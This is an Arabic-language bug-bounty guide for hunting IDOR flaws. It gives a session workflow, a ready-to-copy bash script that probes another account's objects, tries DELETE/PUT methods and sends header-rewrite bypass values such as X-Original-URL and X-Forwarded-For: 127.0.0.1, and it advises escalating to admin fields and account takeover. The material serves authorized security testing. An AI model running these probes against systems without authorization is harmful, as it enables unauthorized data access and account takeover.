## 🎯 الـ Workflow: 10 خطوات لكل جلسة صيد

### 1. افتح بخريطة الكائنات
متفتحش Burp وتتصفح عشوائي. افتح الجدول واختار **3 كائنات** لليوم.

### 2. ولّد بيانات بـ B
لكل كائن: أنشئ نسخة حقيقية عند B، وسجّل المعرّف.

### 3. اختبر بـ A (الاختبار الثلاثي)
```http
# أ) بلا هوية
curl -i https://api.target.com/v1/invoices/5001
# ب) بهوية A على كائن A  → baseline
# ج) بهوية A على كائن B  ← الهدف
curl -i -H "Authorization: Bearer $TOKEN_A" \
        https://api.target.com/v1/invoices/5001
```

### 4. طبّق الأنماط الـ 16
لكل endpoint: راجع [[03-idor-deepdive/02-patterns-and-variants]]

### 5. لو 403 → البلايبوك
راجع [[03-idor-deepdive/04-bypass-playbook]]

### 6. قارن بالبايت
`Burp → Comparer`. أي فرق = احتمال finding.

### 7. صعّد فورًا
```
وصلت؟ → جرّب PATCH/PUT/DELETE
      → جرّب role/admin fields
      → جرّب تغيير الإيميل (→ ATO)
      → جرّب التعداد (كم مستخدم متأثر؟)
```

### 8. وثّق في نفس اللحظة
لقطة شاشة + request/response خام + التوقيت.

### 9. اكتب الـ PoC
خطوات مرقمة يقدر أي حد يعيدها بحسابين.

### 10. ابعت التقرير
متستنّاش "لما ألاقي حاجة أكبر". **ابعته دلوقتي**.

## 🧪 قالب الاختبار اليدوي السريع (انسخه)

```bash
#!/bin/bash
# usage: ./idor-test.sh <endpoint> <object_id>
EP="$1"; ID="$2"
A="Bearer $TOKEN_A"
B="Bearer $TOKEN_B"

echo "=== 1. no auth ==="
curl -s -o /dev/null -w "%{http_code}\n" "$EP/$ID"

echo "=== 2. B on own object (baseline) ==="
curl -s -o /dev/null -w "%{http_code} %{size_download}\n" -H "Authorization: $B" "$EP/$ID"

echo "=== 3. A on B object (TARGET) ==="
curl -s -o /dev/null -w "%{http_code} %{size_download}\n" -H "Authorization: $A" "$EP/$ID"

echo "=== 4. method switching ==="
for m in GET POST PUT PATCH DELETE OPTIONS; do
  echo -n "$m: "
  curl -s -o /dev/null -w "%{http_code}\n" -X $m -H "Authorization: $A" "$EP/$ID"
done

echo "=== 5. content-type switching ==="
for ct in "application/json" "application/xml" "application/x-www-form-urlencoded"; do
  echo -n "$ct: "
  curl -s -o /dev/null -w "%{http_code}\n" -X POST -H "Authorization: $A" \
       -H "Content-Type: $ct" -d "id=$ID" "$EP"
done

echo "=== 6. rewrite headers ==="
for h in "X-Original-URL: $EP/$ID" "X-Rewrite-URL: $EP/$ID" "X-Forwarded-For: 127.0.0.1"; do
  echo -n "$h -> "
  curl -s -o /dev/null -w "%{http_code}\n" -H "Authorization: $A" -H "$h" "$EP/$ID"
done
```

> ⚠️ **استخدمه بوتيرة هادية.** متشغّلوش على كل الـ endpoints دفعة واحدة على production.

## 🕐 جلسة صيد نموذجية (ساعتين)

| الدقيقة | النشاط |
|---|---|
| 0-10 | مراجعة الملاحظات: إيه اللي خلّصته آخر مرة؟ |
| 10-30 | ولّد بيانات جديدة بـ B على 3 كائنات |
| 30-80 | اختبر الـ 3 كائنات بالأنماط كاملة |
| 80-100 | Autorize على المسارات الجديدة |
| 100-110 | وثّق أي فرق سلوكي |
| 110-120 | حدّث الملاحظات + خطوة الغد |

## 📊 إدارة النتايج

| النتيجة | التصرف |
|---|---|
| 🎉 IDOR مؤكد | وثّق + صعّد + اكتب التقرير فورًا |
| ⚠️ فرق سلوكي غريب | سجّله، وارجع له بعد ما تخلص القايمة |

## 🧠 عقلية الصياد (اقرأها كل أسبوع)

1. **الرفض مش فشل**: `Duplicate` معناه إنك وصلت لنفس اللي وصل له محترف. دي إشارة إنك في الطريق الصح.
2. **مافيش "هدف خلص"**: أي تطبيق فيه آلاف الـ endpoints. مفيش حد اختبرهم كلهم.
3. **التناقض هو الدليل**: endpoint محمي وجاره مش محمي = الكود اتحط في وقتين مختلفين. دور على التناقضات.
4. **الملل علامة كويسة**: لو الاختبار بقى ممل ومتكرر → إنت بتشتغل صح. الـ findings بتطلع من التكرار المنهجي.
5. **متقارنش نفسك بغيرك**: اللي بياخد bounties كتير عنده سنين خبرة. قارن نفسك بنفسك الشهر اللي فات.
